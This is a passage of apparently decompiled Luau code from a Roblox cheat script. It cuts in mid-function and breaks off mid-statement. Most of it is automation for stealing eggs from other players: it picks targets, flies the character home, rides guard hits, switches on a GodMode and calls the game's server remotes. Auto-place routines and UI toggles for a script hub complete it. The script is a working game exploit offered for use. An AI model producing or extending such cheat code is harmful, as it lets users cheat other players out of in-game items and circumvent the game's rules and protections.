					while not tbl4.Steal.Carrying and n23 < n16 and not fn16(arg) do
						str3 = "Checking the egg in hand"
						n23 += RunService.Heartbeat:Wait()
					end

					if not tbl4.Steal.Carrying then
						str3 = "The egg is gone, staying to look for it"
						if not fn53(arg) then
							str3 = "The egg is gone"
							return false
						end
					end

					if tbl4.SafeCarry.LineDrop then
						return tbl4.SafeCarry.LineDropHome(arg)
					end

					if tbl4.SafeCarry.Enabled then
						return tbl4.SafeCarry.Home(arg)
					end
					local v25 = stealHome()
					local v26 = tbl4.Root()
					if not v25 or not v26 then
						return false
					end
					local n24 = math.max(v26.Position.Y, v25.Y) + n10

					local function fn58()
						if tbl37.Uid and tbl37.Freed and tbl4.Steal.Carrying then
							return "priority"
						end
						return nil
					end

					local flag5 = true
					local n25 = 0

					while true do
						local v27 = tbl4.Root()

						if not v27 then
							return false
						else
							str3 = "Flying home"
							local position = v27.Position
							local n26 = math.max(n24, position.Y)
							local v28, v29 = fn38(Vector3.new(position.X + (v25.X - position.X) * 0.25, position.Y + (n26 - position.Y) * 0.7, position.Z + (v25.Z - position.Z) * 0.25), arg, flag5, nil, nil, fn58)

							if v28 then
								v28, v29 = fn38(Vector3.new(v25.X, n26, v25.Z), arg, flag5, nil, nil, fn58)
							end

							if v28 then
								v28, v29 = fn38(v25, arg, flag5, nil, nil, fn58)
							end

							if v28 then
								local character = localPlayer.Character
								character = character and character:FindFirstChildOfClass("Humanoid")

								if character then
									character.PlatformStand = false
								end

								task.wait(0.2)
								if not tbl4.Steal.Carrying then
									str3 = "Arrived without the egg"
									return false
								end
								local eggState = tbl.EggState

								if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
									pcall(eggState.DropFieldEgg, "PlayerRequest")
								end

								return true
							end

							if v29 == "priority" then
								local uid2 = tbl37.Uid
								local freed = tbl37.Freed
								local v30 = tbl37
								tbl37.Uid = nil
								v30.Freed = nil
								local v31 = tbl4.Root()
								if not v31 or not uid2 or not freed then
									return false
								end

								if (freed - v31.Position).Magnitude <= n7 * n22 then
									str3 = "Best egg fell nearby, swapping eggs"
									local eggState = tbl.EggState

									if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
										pcall(eggState.DropFieldEgg, "PlayerRequest")
									end

									local n27 = 0

									while tbl4.Steal.Carrying and n27 < 1 do
										n27 += RunService.Heartbeat:Wait()
									end

									if not fn53(arg, uid2) then
										return false
									end
								else
									str3 = "Best egg fell far away, riding a guard hit to it"
									if not fn56(arg, uid2, freed) then
										return false
									end
								end

								local v32 = tbl4.Root()
								n25 = 0

								if v32 then
									n24 = math.max(v32.Position.Y, v25.Y) + n10
								end

								continue
							end

							if v29 == "dropped" and n25 < huge then
								n25 += 1
								if not fn53(arg) then
									return false
								end
								continue
							end

							break
						end
					end

					return false
				end

				local function fn58(arg)
					local n23 = tonumber(arg) or 0
					local tbl38 = { "", "K", "M", "B", "T", "Qa", "Qi" }
					local n24 = 1

					while math.abs(n23) >= 1000 and n24 < #tbl38 do
						n23 /= 1000
						n24 += 1
					end

					return string.format(n24 == 1 and "%.0f%s" or "%.2f%s", n23, tbl38[n24])
				end

				local function fn59(arg)
					if not arg then
						return "None"
					end
					local format = string.format
					local str4 = tostring(arg.Category)
					local n23 = tonumber(arg.Scale) or 0
					local v25 = tostring
					local areaId = arg.AreaId
					local v26 = format("%s  %.2fx  |  value %s  |  %s", str4, n23, fn58(arg.Value), v25(areaId))
					local str5

					if arg.State == "Dropped" then
						str5 = v26 .. "  |  dropped"
					elseif arg.State == "Carried" then
						str5 = v26 .. "  |  carried by a player"
					else
						str5 = v26
					end

					return str5
				end

				local flag5 = false
				local n23 = 0.5
				local n24 = 0.6
				local n25 = 0
				local n26 = 0

				local function fn60()
					local v25 = n11
					tbl4.Steal.Active = true
					tbl4.Steal.Carrying = tbl4.Steal.Carrying == true

					if not tbl4.Steal.Carrying then
						tbl4.Steal.CarryUid = nil
					end

					local v26 = fn22(false, true)
					local v27 = nil
					local v28 = nil
					local lastSkip = nil

					for _, v29 in ipairs(v26) do
						if v29.State == "Carried" then
							v28 = v28 or v29
						elseif not tbl4.StockWaits(v29) then
							local v30 = tbl4.SafeCarry.Unsafe(v29)

							if v30 then
								lastSkip = lastSkip or v30
							else
								v27 = v29
								break
							end
						end
					end

					local tbl38 = { v27 }
					uid = v27 and v27.Uid or nil
					tbl4.Steal.Wanted = v27 ~= nil
					str2 = fn59(v27)

					if v28 then
						str2 ..= "  |  watching " .. tostring(v28.Category)
					end

					if not v27 then
						tbl4.Steal.Active = false
						lastSkip = lastSkip or tbl4.SafeCarry.LastSkip
						tbl4.SafeCarry.LastSkip = nil
						str3 = v28 and "Best egg is carried, waiting for it" or lastSkip and "Skipped: " .. lastSkip or "No egg matches"
						return false
					end

					if not tbl4.ClaimMovement("steal") then
						tbl4.Steal.Active = false
						str3 = "Waiting for Auto Place"
						return false
					end

					if tbl4.Treadmill.Riding or tbl4.OnBelt() then
						tbl4.ExitBelt()
					end

					flag5 = true
					tbl4.HoldBelt()

					local function fn61(arg)
						str3 = arg
						local v29 = fn54(v27, v25)
						local v30 = nil
						local flag6 = false

						if v29 then
							if fn32(v27.Uid, v25) then
								flag6 = fn57(v25)
								v30 = nil
							else
								v30 = str3
							end
						end

						fn28()
						tbl4.Steal.Active = false
						tbl4.Steal.LastFinishedAt = os.clock()
						str3 = flag6 and "Delivered" or v30 or v29 and "Run ended" or "That egg would not come free"
						return true
					end

					local v29 = tbl4.Root()
					local position = typeof(v27.CFrame) == "CFrame" and v27.CFrame.Position or nil

					if v29 and position then
						local flag6 = (position - v29.Position).Magnitude <= n19
						local areaId = v27.AreaId
						local flag7 = localPlayer:GetAttribute("AreaId") == areaId
						if flag6 or flag7 then
							return (fn61("Target is right here, taking it"))
						end
					end

					if tbl4.SafeCarry.Enabled and tbl4.SafeCarry.Approach == "Run" then
						local v30 = tbl4.SafeCarry.RunTo(v27, v25)
						local flag6, v31

						if v30 then
							if fn32(v27.Uid, v25) then
								flag6 = fn57(v25)
								v31 = nil
							else
								flag6 = false
								v31 = str3
							end
						else
							tbl35[v27.Uid] = os.clock() + n12
							flag6 = false
							v31 = nil
						end

						fn28()
						tbl4.Steal.Active = false
						tbl4.Steal.LastFinishedAt = os.clock()
						str3 = flag6 and "Delivered" or v31 or v30 and "Run ended" or "That egg would not come free"
						return true
					end

					local v30 = fn22(true)
					local str4 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
					local tbl39 = {}

					for _, v31 in ipairs(v30) do
						if fn39(v31) or type(v31.Uid) == "string" and string.sub(v31.Uid, 1, #str4) == str4 then
							table.insert(tbl39, v31)
						end
					end

					if #tbl39 ~= 0 then
						v30 = tbl39
					end

					local v31, v32 = fn36(v30)

					if not v31 then
						tbl4.Steal.Active = false
						str3 = "No egg matches"
						return false
					end

					if v31.Uid == v27.Uid then
						return (fn61("Target is the closest egg, taking it"))
					end
					local v33, v34 = fn40(v31)
					local v35

					if v34 and v29 then
						local v36, v37, v38 = ipairs(v30)
						local huge3 = math.huge
						v35 = v31

						for _, v39 in v36, v37, v38 do
							local position2 = typeof(v39.CFrame) == "CFrame" and v39.CFrame.Position or nil

							if v39.Uid ~= v27.Uid and v39.AreaId == v31.AreaId and position2 then
								local magnitude = (position2 - v29.Position).Magnitude

								if (position2 - v34).Magnitude > n18 then
									magnitude += n18
								end

								if magnitude < huge3 then
									huge3 = magnitude
									v35 = v39
								end
							end
						end
					else
						v35 = v31
					end

					str3 = string.format("Sleeping guard egg %d studs away", math.floor(v32 + 0.5))

					if not v35 then
						tbl4.Steal.Active = false
						str3 = "No egg matches"
						return false
					end

					local v36, v37 = fn48(v35, v25, false, tbl38[1])
					if not v36 then
						tbl4.Steal.Active = false
						return false
					end
					local uid2 = nil
					local uid3 = v27.Uid
					local n27 = 0

					while true do
						if v37 and not fn16(v25) then
							str3 = "Holding for the guard hit"

							if fn41(v25, v37, function(arg)
								if not uid2 and tbl37.Uid and tbl37.Freed then
									uid2 = tbl37.Uid
									arg.Destination = tbl37.Freed + Vector3.new(0, 3, 0)
									local v38 = tbl37
									tbl37.Uid = nil
									v38.Freed = nil
									str3 = "Best egg fell, jumping to it instead"
								end
							end) then
								n27 += 1

								if uid2 then
									uid3 = uid2
									fn53(v25, uid2)
									break
								else
									local v38 = tbl38[n27]
									local v39
									v39, v37 = fn48(v38, v25, true, tbl38[n27 + 1])

									if v39 then
										if v38 and type(v38.Uid) == "string" then
											uid3 = v38.Uid
										end

										continue
									end
								end
							end
						end

						break
					end

					if not fn32(uid3, v25) then
						local v38 = str3
						fn28()
						tbl4.Steal.Active = false
						tbl4.Steal.LastFinishedAt = os.clock()
						str3 = v38
						return true
					end

					local v38 = fn57(v25)
					fn28()
					tbl4.Steal.Active = false
					tbl4.Steal.LastFinishedAt = os.clock()
					str3 = v38 and "Delivered" or "Run ended"
					return true
				end

				local eggState = tbl.EggState

				if type(eggState) == "table" then
					for _, v25 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "SnapshotRefreshed" }) do
						local v26 = eggState[v25]

						if type(v26) == "table" and type(v26.Connect) == "function" then
							local ok, result = pcall(v26.Connect, v26, function()
								tbl3.Wake()
							end)

							if ok and result then
								fn4(function()
									pcall(function()
										result:Disconnect()
									end)
								end)
							end
						end
					end
				end

				tbl3.Add(function()
					local flag6 = nil

					if v21 then
						flag6 = type(v21.Set) == "function"
					end

					if flag6 then
						pcall(v21.Set, nil, str3)
					end

					local flag7 = nil

					if v22 then
						flag7 = type(v22.Set) == "function"
					end

					if flag7 then
						pcall(v22.Set, nil, str2)
					end

					if not tbl4.Toggle(v20, false) then
						return false
					end
					local v25, v26, v27 = fn17()

					if v25 then
						if v26 == "night" then
							fn19()
						end

						tbl4.Movement.StealFirst = true
						tbl4.Steal.Wanted = false

						if flag4 then
							n11 += 1
							tbl4.Steal.Active = false
							fn28()
							tbl4.StopWalking()
						end

						local n27 = math.max(0, math.ceil(v25 - v27))

						if v26 == "wall" then
							str3 = string.format("Field wall up, %ds", n27)
						else
							str3 = string.format("Night, going again in %ds", n27)
						end

						return false
					end

					if v23 and n14 == math.huge then
						n14 = os.clock() + n13
					end

					if flag4 then
						return true
					end

					if fn20() then
						str3 = "Night over, waiting for the field to reset"
						tbl3.Wake()
						return false
					end

					local stealFirst = tbl4.Movement.StealFirst
					local owner = tbl4.Movement.Owner
					local flag8 = tbl4.Movement.PlaceWanted and not stealFirst

					if not flag8 then
						flag8 = owner ~= nil and owner ~= "steal" and owner ~= "treadmill" and owner ~= "scramble"
					end

					if flag8 then
						if n25 <= os.clock() then
							n25 = os.clock() + n23
							local ok, result = pcall(fn22, false, false)
							ok = ok and type(result) == "table" and result[1] ~= nil and not tbl4.StockWaits(result[1])
							tbl4.Steal.Wanted = ok

							if ok then
								tbl4.Movement.StealFirst = true
							end
						end

						if tbl4.Steal.Wanted then
							local v28 = tostring
							owner = owner or "Auto Place"
							str3 = "Egg found, waiting for " .. v28(owner) .. " to stop"
						else
							str3 = "Waiting for " .. tostring(owner or "Auto Place")
						end

						return true
					end

					if os.clock() < n26 then
						return true
					end
					tbl4.Movement.StealFirst = false
					flag4 = true

					task.spawn(function()
						local ok = pcall(fn60)

						if flag5 then
							flag5 = false
							tbl4.ReleaseBelt()
						end

						if not ok then
							fn28()
							tbl4.Steal.Active = false
						end

						local v28 = uid
						uid = nil
						local v29 = v28 and tbl31[v28]

						if v29 and v29.Once then
							tbl31[v28] = nil
						end

						local v30 = tbl37
						local v31 = tbl37
						tbl37.Uid = nil
						v30.Freed = nil
						v31.Token = nil

						if str3 == "Delivered" and not tbl4.IsNight() then
							tbl4.Movement.StealFirst = true
						end

						if not tbl4.Steal.Wanted then
							n26 = os.clock() + n24
						end

						tbl4.ReleaseMovement("steal")
						flag4 = false
						tbl3.Wake()
					end)

					return true
				end)
			end

			v20 = v5

			fn15 = function()
				n11 += 1
				table.clear(tbl35)
				tbl4.Steal.Active = false
				tbl4.Steal.Wanted = false
				local v25 = tbl4.Toggle(v20, false)
				tbl4.Shield("steal", v25)

				if not v25 then
					tbl4.Movement.StealFirst = false
					table.clear(tbl31)
					table.clear(tbl32)
					table.clear(tbl33)
				end

				fn28()
				tbl4.StopWalking()
				tbl3.Wake()
			end

			do
				local function fn42()
					n11 += 1
					tbl4.Steal.Active = false
					fn28()
					tbl4.StopWalking()
				end

				local function fn43()
					if tbl4.Toggle(v20, false) then
						return true
					end

					if v20 and type(v20.Set) == "function" then
						pcall(v20.Set, v20, true)
					end

					return false
				end

				tbl4.CancelSteal = function(arg)
					if type(arg) ~= "string" then
						return
					end
					tbl31[arg] = nil
					tbl32[arg] = nil
					tbl33[arg] = true

					if flag4 and uid == arg then
						fn42()
					end

					tbl3.Wake()
				end

				tbl4.StealQueue = function()
					local tbl36 = {}

					for k in pairs(tbl31) do
						table.insert(tbl36, k)
					end

					table.sort(tbl36, function(arg, arg2)
						local at = tbl31[arg].At
						local at2 = tbl31[arg2].At
						if at ~= at2 then
							return at < at2
						end
						return arg < arg2
					end)

					return tbl36
				end

				tbl4.PrioritizeSteal = function(arg)
					if type(arg) ~= "string" or fn18() then
						return
					end
					local n20 = 0

					for _, v25 in pairs(tbl31) do
						if v25.At < n20 then
							n20 = v25.At
						end
					end

					tbl31[arg] = { At = n20 - 1, Once = false }
					tbl33[arg] = nil
					tbl35[arg] = nil

					if fn43() and flag4 and not tbl4.Steal.Carrying and uid ~= arg then
						fn42()
					end

					tbl3.Wake()
				end

				tbl4.MoveInPlan = function(arg, arg2)
					if type(arg) ~= "string" or arg2 ~= -1 and arg2 ~= 1 or fn18() then
						return
					end
					local v25 = tbl4.StealPlan()
					local v26 = table.find(v25, arg)
					local n20 = v26 and v26 + arg2
					if not n20 or n20 < 1 or n20 > #v25 then
						return
					end
					table.remove(v25, v26)
					table.insert(v25, n20, arg)
					local n21 = math.max(v26, n20)

					for i, v27 in ipairs(v25) do
						if i <= n21 or tbl31[v27] then
							local v28 = tbl31[v27]

							if v28 then
								v28.At = i
							else
								tbl31[v27] = { At = i, Once = false }
							end

							tbl33[v27] = nil
						end
					end

					if flag4 and not tbl4.Steal.Carrying and uid and v25[1] ~= uid then
						fn42()
					end

					tbl3.Wake()
				end

				tbl4.StealPlan = function()
					if not tbl4.Toggle(v20, false) or tbl4.IsNight() then
						return {}, nil
					end
					local tbl36 = {}

					if uid then
						table.insert(tbl36, uid)
					end

					local ok, result = pcall(fn22, false, true)

					if ok and type(result) == "table" then
						for _, v25 in ipairs(result) do
							if v25.Uid ~= uid then
								table.insert(tbl36, v25.Uid)
							end
						end
					end

					return tbl36, uid
				end

				tbl4.SetPriority = function(arg, arg2)
					if arg2 then
						tbl4.PrioritizeSteal(arg)
					else
						tbl4.CancelSteal(arg)
					end
				end

				tbl4.ResortSteal = function()
					if flag4 and not tbl4.Steal.Carrying and uid and not tbl31[uid] then
						local ok, result = pcall(fn22, false, true)

						if ok and type(result) == "table" then
							local v25 = nil

							for _, v26 in ipairs(result) do
								if v26.State ~= "Carried" then
									v25 = v26
									break
								else
									v25 = nil
								end
							end

							if not v25 or v25.Uid ~= uid then
								fn42()
							end
						end
					end

					tbl3.Wake()
				end

				tbl4.StealNow = function(arg, arg2)
					if type(arg) ~= "string" or fn18() then
						return
					end

					if not tbl31[arg] then
						local n20 = 0

						for _, v25 in pairs(tbl31) do
							if v25.At > n20 then
								n20 = v25.At
							end
						end

						tbl31[arg] = { At = n20 + 1, Once = arg2 == true }
					end

					tbl33[arg] = nil
					tbl35[arg] = nil
					local flag5 = fn43() and flag4 and not tbl4.Steal.Carrying and uid ~= arg

					if flag5 then
						flag5 = not (uid and tbl31[uid])
					end

					if flag5 then
						fn42()
					end

					tbl3.Wake()
				end
			end

			fn4(function()
				tbl4.GodMode(false)
				tbl4.ReleaseMovement("steal")
				fn28()
			end)
		end

		tbl4.UiQueue = {}

		tbl4.UiDefer = function(arg)
			table.insert(tbl4.UiQueue, arg)
		end

		tbl4.Notify = function(arg, arg2)
			if type(v) == "table" and type(v.Notify) == "function" then
				pcall(v.Notify, arg, arg2, 5)
			end
		end

		local connection = RunService.Heartbeat:Connect(function()
			local uiQueue = tbl4.UiQueue
			if #uiQueue == 0 then
				return
			end
			tbl4.UiQueue = {}

			for _, v19 in ipairs(uiQueue) do
				pcall(v19)
			end
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)

		tbl4.Rift = { Requirements = {}, At = 0, Busy = false, Next = 0, Handles = {}, Restart = {} }

		tbl4.RiftOn = function(arg)
			local v19 = tbl4.Rift.Handles[arg]
			return v19 ~= nil and tbl4.Toggle(v19, false) == true
		end

		do
			local n8 = 8

			local function fn11(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag3 = type(directory) == "table" and directory[tostring(arg)] or nil
				return type(flag3) == "table" and flag3 or nil
			end

			tbl4.EggRarity = function(arg)
				local v19 = fn11(arg.AssetCategory)
				local rarity = v19 and v19.Rarity or nil
				local flag3 = type(rarity) == "table"

				if flag3 then
					flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag3 or 0
			end

			tbl4.EggIncome = function(arg)
				local n9 = fn11(arg.AssetCategory)
				n9 = n9 and tonumber(n9.EarningRate) or 0
				local n10 = tonumber(arg.AssetScale) or 0
				if n10 <= 0 then
					return 0
				end
				local n11 = n10 > 5 and (n10 / 5) ^ 1.2 * 19.637875755794113 or n10 ^ 1.85
				local mutations = tbl.Mutations
				local flag3 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n12 = 1

				if flag3 then
					local ok
					ok, n12 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n12) == "number"
					local n13 = 1

					if not ok then
						n12 = n13
					end
				end

				return n9 * n11 * n12
			end

			tbl4.RiftShortfall = function()
				local tbl25 = {}

				for _, requirement in ipairs(tbl4.Rift.Requirements) do
					tbl25[requirement] = (tbl25[requirement] or 0) + 1
				end

				if next(tbl25) == nil then
					return tbl25
				end
				local save = tbl.Save
				local flag3 = type(save) == "table" and type(save.Get) == "function"
				local result = nil

				if flag3 then
					local ok
					ok, result = pcall(save.Get)
					result = ok and type(result) == "table" and result or nil
				end

				if not result then
					return {}
				end
				local tbl26 = {}
				local v19 = pairs
				local equippedAssets = result.EquippedAssets or {}

				for _, equippedAsset in v19(equippedAssets) do
					tbl26[equippedAsset] = true
				end

				local v20 = pairs
				local inventory = result.Inventory or {}

				for k, v21 in v20(inventory) do
					local str2 = type(v21) == "table" and tostring(v21.Category) or nil
					local flag4

					if str2 then
						flag4 = (tbl25[str2] or 0) > 0
					else
						flag4 = str2
					end

					flag4 = flag4 and v21.InFuse ~= true and v21.IsFavorite ~= true and not tbl26[k]

					if flag4 then
						tbl25[str2] = tbl25[str2] - 1
					end
				end

				for k, v21 in pairs(tbl25) do
					if v21 <= 0 then
						tbl25[k] = nil
					end
				end

				return tbl25
			end

			local function fn12()
				for k in pairs(tbl4.Rift.Handles) do
					if tbl4.RiftOn(k) then
						return true
					end
				end

				return false
			end

			tbl3.Add(function()
				local rift = tbl4.Rift
				local busy = rift.Busy

				if not busy then
					local next_ = rift.Next
					busy = os.clock() < next_
				end

				if busy or not fn12() then
					return false
				end
				rift.Busy = true
				rift.Next = os.clock() + n8

				task.spawn(function()
					local rfScrambleTradeInAskState = networking:FindFirstChild("RF/ScrambleTradeIn/AskState")

					if rfScrambleTradeInAskState and rfScrambleTradeInAskState:IsA("RemoteFunction") then
						local ok, result = pcall(rfScrambleTradeInAskState.InvokeServer, rfScrambleTradeInAskState)

						if ok and type(result) == "table" then
							local requirements = {}

							if result.Unlocked == true and type(result.Requirements) == "table" and tbl4.Lab.BannerOk(result.BannerId) then
								for _, requirement in ipairs(result.Requirements) do
									table.insert(requirements, tostring(requirement))
								end
							end

							rift.Requirements = requirements
							rift.At = os.clock()
						end
					end

					rift.Busy = false
					tbl3.Wake()
				end)

				return false
			end)
		end

		local tbl25
		tbl25 = { "Always", "Steal Idle", "After Steal", "Night Only" }
		local tbl26
		tbl26 = { "Biggest Size", "Highest Value", "Smallest Size", "Backpack Order" }
		local v19
		v19 = tbl25[1]
		local v20
		v20 = tbl26[2]
		local tbl27
		tbl27 = {}
		local tbl28
		tbl28 = {}
		local n8
		n8 = 0

		do
			local function fn11()
				if type(tbl4.PlaceEggRefresh) == "function" then
					tbl4.PlaceEggRefresh()
				end
			end

			local function fn12(arg)
				local tbl29 = {}

				if type(arg) == "table" then
					for k, v21 in pairs(arg) do
						k = v21 == true and type(k) == "string" and k or type(v21) == "string" and v21 or nil

						if k then
							table.insert(tbl29, k)
						end
					end
				end

				return tbl29
			end

			tbl4.PlaceEggStatusRow = v14:CreateText({ Name = "Pen Status", Text = "Pen status unknown" })

			tbl4.PlaceEggHandle = v14:CreateToggle({
				Name = "Auto Place Egg",
				Default = false,
				Callback = function()
					if type(tbl4.PlaceEggRestart) == "function" then
						tbl4.PlaceEggRestart()
					end
				end,
			})

			local placeEggHandle = tbl4.PlaceEggHandle

			v14:CreateDropdown({
				Name = "Place Egg Rule",
				Options = tbl25,
				Default = tbl25[1],
				SubOf = placeEggHandle,
				Callback = function(arg)
					if table.find(tbl25, arg) then
						v19 = arg
					end
				end,
			})

			v14:CreateDropdown({
				Name = "Place Egg Order",
				Options = tbl26,
				Default = tbl26[2],
				SubOf = placeEggHandle,
				Callback = function(arg)
					if table.find(tbl26, arg) then
						v20 = arg
					end
				end,
			})

			local tbl29 = {}

			for i = 2, #tbl13 do
				table.insert(tbl29, tbl13[i])
			end

			if #tbl29 > 0 then
				fn6(v14:CreateMultiDropdown({
					Name = "Place Rarities",
					Note = "Only place eggs of the picked rarities (empty = all)",
					Options = tbl29,
					Default = {},
					SubOf = placeEggHandle,
					Callback = function(arg)
						local tbl30 = {}

						for _, v21 in ipairs(fn12(arg)) do
							local v22 = tbl14[v21]

							if v22 and v22 > 0 then
								tbl30[v22] = true
							end
						end

						tbl27 = tbl30
						fn11()
					end,
				}))
			end

			local tbl30 = {}
			local tbl31 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl32 = {}

			if type(directory) == "table" then
				for k, v21 in pairs(directory) do
					local rarity = type(v21) == "table" and v21.Rarity or nil
					local flag3 = type(rarity) == "table"

					if flag3 then
						flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag3 = flag3 or nil

					if flag3 then
						table.insert(tbl32, {
							Category = tostring(k),
							Name = tostring(v21.DisplayName or k),
							Rarity = flag3,
							RarityName = tostring(rarity.DisplayName or rarity._id or flag3),
						})
					end
				end
			end

			table.sort(tbl32, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v21 in ipairs(tbl32) do
				local str2 = string.format("%s [%s]", v21.Name, v21.RarityName)

				if tbl31[str2] then
					str2 = string.format("%s [%s] (%s)", v21.Name, v21.RarityName, v21.Category)
				end

				table.insert(tbl30, str2)
				tbl31[str2] = v21.Category
			end

			if #tbl30 > 0 then
				fn6(v14:CreateMultiDropdown({
					Name = "Place Specific Eggs",
					Note = "Only place these eggs (empty = all)",
					Options = tbl30,
					Default = {},
					SubOf = placeEggHandle,
					Callback = function(arg)
						local tbl33 = {}

						for _, v21 in ipairs(fn12(arg)) do
							if tbl31[v21] then
								tbl33[tbl31[v21]] = true
							end
						end

						tbl28 = tbl33
						fn11()
					end,
				}))
			end

			local tbl33 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local n9 = 0
			local str2 = "M/s"

			local function fn13(arg, arg2)
				if arg ~= nil then
					n9 = math.max(0, math.floor(tonumber(arg) or n9))
				end

				if arg2 ~= nil then
					str2 = tostring(arg2)
				end

				n8 = n9 * (tbl33[str2] or tbl33["M/s"]).Mult
			end

			fn5(v14, {
				Name = "Min Place Value",
				Note = "Skip eggs worth less than this (0 = off)",
				SubOf = placeEggHandle,
				Legacy = "Place Min Value",
				SectionName = "Auto Place Egg",
				OnRaw = function(arg)
					fn13(math.floor(arg / 1000), "K/s")
				end,
			})
		end

		do
			local n9 = 5
			local n10 = 26
			local n11 = 6
			local n12 = 8
			local n13 = 0
			local n14 = 30
			local n15 = 12
			local placeEggHandle = nil
			local placeEggStatusRow = nil
			local str2 = "Pen status unknown"
			local flag3 = false
			local tbl29 = {}
			local n16 = 0
			local v21 = nil
			local n17 = 30

			local function fn11(arg, arg2)
				local v22 = networking:FindFirstChild(arg)
				if not v22 or not v22:IsA("RemoteFunction") then
					return false, nil
				end
				return pcall(v22.InvokeServer, v22, arg2)
			end

			local function fn12(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag4 = type(directory) == "table" and directory[tostring(arg.AssetCategory)] or nil
				return type(flag4) == "table" and flag4 or nil
			end

			local function fn13(arg)
				local rarity = fn12(arg)
				rarity = rarity and rarity.Rarity or nil
				local flag4 = type(rarity) == "table"

				if flag4 then
					flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag4 or 0
			end

			local function fn14(arg)
				local n18 = fn12(arg)
				n18 = n18 and tonumber(n18.EarningRate) or 0
				local n19 = tonumber(arg.AssetScale) or 0
				if n19 <= 0 then
					return 0
				end
				local n20 = n19 > 5 and (n19 / 5) ^ 1.2 * 19.637875755794113 or n19 ^ 1.85
				local mutations = tbl.Mutations
				local flag4 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n21 = 1

				if flag4 then
					local ok
					ok, n21 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n21) == "number"
					local n22 = 1

					if not ok then
						n21 = n22
					end
				end

				return n18 * n20 * n21
			end

			local function fn15()
				local tbl30 = {}
				local backpack = localPlayer:FindFirstChildOfClass("Backpack")
				if not backpack then
					return tbl30
				end
				local n18 = 0

				for _, child in ipairs(backpack:GetChildren()) do
					local attribute = child:GetAttribute("UID")

					if type(attribute) == "string" then
						n18 += 1
						tbl30[attribute] = n18
					end
				end

				return tbl30
			end

			local function fn16()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return {}
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return {}
				end
				local v22 = fn15()
				local v23 = tbl4.Lab.StockTargets()
				local tbl30 = {}

				if tbl4.RiftOn("Place") then
					tbl30 = tbl4.RiftShortfall()

					for _, v24 in pairs(result) do
						if type(v24) == "table" and v24.Placement ~= nil then
							local str3 = tostring(v24.AssetCategory)

							if (tbl30[str3] or 0) > 0 then
								tbl30[str3] = tbl30[str3] - 1
							end
						end
					end
				end

				local tbl31 = {}

				for k, v24 in pairs(result) do
					if type(v24) == "table" and v24.Placement == nil and not tbl29[k] and not tbl4.Lab.Reserved[k] then
						local str3 = tostring(v24.AssetCategory)

						if (v23[str3] or 0) > 0 then
							v23[str3] = v23[str3] - 1
						else
							local v25 = fn14(v24)
							local str4 = tostring(v24.AssetCategory)
							local flag4 = next(tbl27) == nil or tbl27[fn13(v24)] == true
							local flag5 = next(tbl28) == nil or tbl28[str4] == true
							local flag6 = n8 <= 0 or v25 >= n8
							local flag7 = (tbl30[str4] or 0) > 0

							if flag7 then
								tbl30[str4] = tbl30[str4] - 1
							end

							if tbl4.Lab.PlaceOn and tbl4.Lab.IsLabPet(str4) then
								flag7 = true
							end

							flag6 = tbl4.Toggle(tbl4.PlaceEggHandle, false) == true and flag4 and flag5 and flag6

							if flag7 or flag6 then
								table.insert(tbl31, {
									Uid = k,
									Scale = tonumber(v24.AssetScale) or 0,
									Income = v25,
									Slot = v22[k] or math.huge,
									Rift = flag7,
								})
							end
						end
					end
				end

				table.sort(tbl31, function(arg, arg2)
					if arg.Rift ~= arg2.Rift then
						return arg.Rift
					end

					if v20 == tbl26[2] and arg.Income ~= arg2.Income then
						return arg.Income > arg2.Income
					end

					if v20 == tbl26[3] and arg.Scale ~= arg2.Scale then
						return arg.Scale < arg2.Scale
					end

					if v20 == tbl26[4] and arg.Slot ~= arg2.Slot then
						return arg.Slot < arg2.Slot
					end
					return arg.Scale > arg2.Scale
				end)

				return tbl31
			end

			local function fn17(arg)
				if arg == 0 then
					return false
				end

				if not tbl4.Toggle(placeEggHandle, false) then
					return true
				end
				local steal = tbl4.Steal
				if v19 == tbl25[2] then
					return not steal.Active and not steal.Carrying
				end

				if v19 == tbl25[3] then
					local flag4 = steal.LastFinishedAt > 0
					local flag5

					if flag4 then
						local lastFinishedAt = steal.LastFinishedAt
						flag5 = os.clock() - lastFinishedAt <= n15
					else
						flag5 = flag4
					end

					return flag5
				end

				if v19 == tbl25[4] then
					return tbl4.IsNight()
				end
				return true
			end

			local function fn18()
				local eggState = tbl.EggState
				local flag4 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
				local n18 = 0

				if flag4 then
					local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

					if ok and type(result) == "table" then
						for _, v22 in pairs(result) do
							if type(v22) == "table" and v22.Placement ~= nil then
								n18 += 1
							end
						end
					end
				end

				local save = tbl.Save
				local flag5 = type(save) == "table" and type(save.Get) == "function"
				local flag6 = nil

				if flag5 then
					local ok, result = pcall(save.Get)
					flag6 = ok and type(result) == "table" and result or nil
				end

				local flag7 = flag6 and type(flag6.EquippedAssets) == "table"
				local n19 = 0

				if flag7 then
					for k in pairs(flag6.EquippedAssets) do
						n19 += 1
					end
				end

				local v22 = fn2(function()
					return ReplicatedStorage.Data.Bases
